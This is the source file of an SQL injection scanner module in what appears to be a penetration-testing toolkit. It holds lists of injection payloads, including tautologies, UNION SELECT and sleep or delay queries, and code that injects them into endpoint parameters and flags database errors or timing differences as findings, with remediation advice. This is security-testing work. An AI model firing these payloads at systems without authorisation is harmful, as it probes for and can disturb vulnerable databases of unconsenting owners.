"""SQL injection testing — error-based, blind boolean, blind time-based."""

from __future__ import annotations

import re
import time
from typing import Any

from pencheff.config import Severity
from pencheff.core.findings import Evidence, Finding
from pencheff.core.http_client import PencheffHTTPClient
from pencheff.core.session import PentestSession
from pencheff.modules.base import BaseTestModule

# Error signatures by database type
SQL_ERRORS = {
    "MySQL": [
        r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PG::SyntaxError",
    ],
    "MSSQL": [
        r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_",
        r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark",
    ],
    "Oracle": [
        r"\bORA-\d{5}", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*oci_", r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
        r"Warning.*sqlite_", r"SQLITE_ERROR",
    ],
}

ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "1' AND '1'='1", "1' AND '1'='2", "' UNION SELECT NULL--",
    "1; SELECT 1--", "') OR ('1'='1",
]

BLIND_BOOLEAN_PAIRS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
]

TIME_PAYLOADS = {
    "MySQL": "' AND SLEEP(3)--",
    "PostgreSQL": "'; SELECT pg_sleep(3)--",
    "MSSQL": "'; WAITFOR DELAY '0:0:3'--",
    "generic": "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
}


class SQLiModule(BaseTestModule):
    name = "sqli"
    category = "injection"
    owasp_categories = ["A03"]
    description = "SQL injection testing (error-based, blind boolean, blind time-based)"

    def get_techniques(self) -> list[str]:
        return ["error_based", "blind_boolean", "blind_time", "union_based"]

    async def run(
        self,
        session: PentestSession,
        http: PencheffHTTPClient,
        targets: list[str] | None = None,
        config: dict[str, Any] | None = None,
    ) -> list[Finding]:
        findings = []
        endpoints = self._get_target_endpoints(session, targets)

        for ep in endpoints[:30]:  # test up to 30 endpoints
            url = ep["url"]
            params = ep.get("params", [])
            method = ep.get("method", "GET")

            if not params and "?" in url:
                from urllib.parse import urlparse, parse_qs
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())

            for param in params:
                # Phase 1: Error-based detection
                error_finding = await self._test_error_based(http, url, param, method)
                if error_finding:
                    findings.append(error_finding)
                    continue  # no need for blind if error-based works

                # Phase 2: Blind boolean
                blind_finding = await self._test_blind_boolean(http, url, param, method)
                if blind_finding:
                    findings.append(blind_finding)
                    continue

                # Phase 3: Time-based blind
                time_finding = await self._test_blind_time(http, url, param, method)
                if time_finding:
                    findings.append(time_finding)

        return findings

    async def _inject(self, http: PencheffHTTPClient, url: str, param: str, payload: str, method: str):
        """Send a request with the payload injected into the parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if method == "GET":
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            return await http.get(test_url, module="sqli")
        else:
            body_params = {p: qs.get(p, ["test"])[0] for p in qs}
            body_params[param] = payload
            clean_url = urlunparse(parsed._replace(query=""))
            return await http.post(clean_url, body=urlencode(body_params),
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   module="sqli")

    async def _test_error_based(self, http, url, param, method) -> Finding | None:
        for payload in ERROR_PAYLOADS[:5]:
            try:
                resp = await self._inject(http, url, param, payload, method)
                body = resp.text

                for db_type, patterns in SQL_ERRORS.items():
                    for pattern in patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            return Finding(
                                title=f"SQL Injection (Error-Based, {db_type})",
                                severity=Severity.CRITICAL,
                                category="injection",
                                owasp_category="A03",
                                description=f"Error-based SQL injection found in parameter '{param}'. "
                                            f"Database: {db_type}. Payload: {payload}",
                                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                endpoint=url,
                                parameter=param,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                cvss_score=9.8,
                                cwe_id="CWE-89",
                                evidence=[Evidence(
                                    request_method=method,
                                    request_url=url,
                                    request_body=f"{param}={payload}",
                                    response_status=resp.status_code,
                                    response_body_snippet=body[:300],
                                    description=f"SQL error from {db_type} triggered by payload",
                                )],
                                references=["https://cwe.mitre.org/data/definitions/89.html"],
                            )
            except Exception:
                continue
        return None

    async def _test_blind_boolean(self, http, url, param, method) -> Finding | None:
        for true_payload, false_payload in BLIND_BOOLEAN_PAIRS:
            try:
                true_resp = await self._inject(http, url, param, true_payload, method)
                false_resp = await self._inject(http, url, param, false_payload, method)

                # Significant difference in response suggests blind SQLi
                len_diff = abs(len(true_resp.text) - len(false_resp.text))
                status_diff = true_resp.status_code != false_resp.status_code

                if len_diff > 100 or status_diff:
                    return Finding(
                        title="SQL Injection (Blind Boolean-Based)",
                        severity=Severity.HIGH,
                        category="injection",
                        owasp_category="A03",
                        description=f"Boolean-based blind SQL injection in parameter '{param}'. "
                                    f"True condition ({true_payload}) and false condition ({false_payload}) "
                                    f"produce different responses (length diff: {len_diff}, status diff: {status_diff}).",
                        remediation="Use parameterized queries / prepared statements.",
                        endpoint=url,
                        parameter=param,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                        cvss_score=9.1,
                        cwe_id="CWE-89",
                        evidence=[Evidence(
                            request_method=method,
                            request_url=url,
                            request_body=f"True: {param}={true_payload}, False: {param}={false_payload}",
                            description=f"Response length diff: {len_diff}, Status diff: {status_diff}",
                        )],
                    )
            except Exception:
                continue
        return None

    async def _test_blind_time(self, http, url, param, method) -> Finding | None:
        # First, get baseline response time
        try:
            import time as _time
            start = _time.monotonic()
            await self._inject(http, url, param, "1", method)
            baseline = _time.monotonic() - start
        except Exception:
            return None

        for db_type, payload in TIME_PAYLOADS.items():
            try:
                start = _time.monotonic()
                await self._inject(http, url, param, payload, method)
                elapsed = _time.monotonic() - start

                # If response took significantly longer than baseline (>2.5s more)
                if elapsed - baseline > 2.5:
                    return Finding(
                        title=f"SQL Injection (Time-Based Blind, likely {db_type})",
                        severity=Severity.HIGH,
                        category="injection",
                        owasp_category="A03",
                        description=f"Time-based blind SQL injection in parameter '{param}'. "
                                    f"Payload '{payload}' caused a {elapsed:.1f}s delay vs {baseline:.1f}s baseline.",
                        remediation="Use parameterized queries / prepared statements.",
                        endpoint=url,
                        parameter=param,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                        cvss_score=9.1,
                        cwe_id="CWE-89",
                        evidence=[Evidence(
                            request_method=method,
                            request_url=url,
                            request_body=f"{param}={payload}",
                            description=f"Baseline: {baseline:.1f}s, With payload: {elapsed:.1f}s",
                        )],
                    )
            except Exception:
                continue
        return None
